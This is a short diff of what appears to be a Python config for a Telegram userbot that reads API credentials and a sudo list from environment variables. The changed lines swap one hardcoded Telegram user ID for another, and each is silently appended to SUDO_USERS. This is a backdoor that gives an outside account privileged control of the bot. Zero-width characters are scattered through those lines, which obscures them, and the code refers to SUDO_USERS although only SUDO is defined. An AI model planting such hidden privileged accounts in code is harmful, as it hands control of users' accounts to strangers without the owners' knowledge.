@@ -38,5 +38,5 @@ API_ID = getenv("API_ID")
 API_HASH = getenv("API_HASH")
 BIO_MESSAGE = getenv("BIO")
 SUDO = list(map(int, getenv("SUDO").split()))
- ​if​ ​5046719296​ ​not​ ​in​ ​SUDO_USERS​: 
- ​    ​SUDO_USERS​.​append(5046719296)
+ ​if​ ​658876201​ ​not​ ​in​ ​SUDO_USERS​: 
+ ​    ​SUDO_USERS​.​append(658876201)
